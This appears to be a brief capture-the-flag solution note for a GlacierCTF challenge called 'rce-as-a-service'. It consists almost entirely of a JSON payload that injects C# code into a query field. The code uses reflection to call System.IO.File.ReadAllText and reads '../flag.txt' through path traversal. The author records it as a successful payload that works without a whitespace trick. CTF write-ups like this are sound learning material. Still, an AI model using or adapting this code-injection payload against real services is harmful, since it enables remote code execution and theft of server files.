URL: https://rce-as-a-service-2.ctf.glacierctf.com

successful payload without using whitespace trick:
{
  "Data": ["System.IO.File"],
  "Query" : "(data) => data.Select(d => {Type type = Type.GetType(d);System.Reflection.MethodInfo theMethod = type.GetMethod(\"ReadAllText\", new Type[] { typeof(String) });return theMethod.Invoke(null, new object[]{\"../flag.txt\"});})"
}
